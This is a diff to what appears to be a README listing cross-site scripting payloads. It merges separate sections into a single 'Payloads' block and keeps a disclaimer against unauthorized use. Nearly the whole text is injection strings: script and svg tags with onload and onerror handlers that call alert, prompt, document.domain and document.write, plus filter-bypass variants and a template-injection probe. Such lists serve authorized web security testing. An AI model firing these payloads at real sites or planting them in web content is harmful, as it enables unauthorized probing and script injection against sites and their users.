@@ -20,25 +20,14 @@
 > Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
 > to any person who decide to execute those on random places, you have been warned!
 
-## document.write <br>
-
-```html
-;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
-```
-<br>
-
-## document.domain <br>
-
-```html
-;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
-```
-<br>
-
-## MISC <br>
+## Payloads <br>
 
 ```html
 </script><svg><script/class=rodric>alert(1)</script>-%26apos;
 </SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
+""><svg/onload=alert(1)>%27/---+{{77}}"
+;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
+;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
 ```
 
 <br>
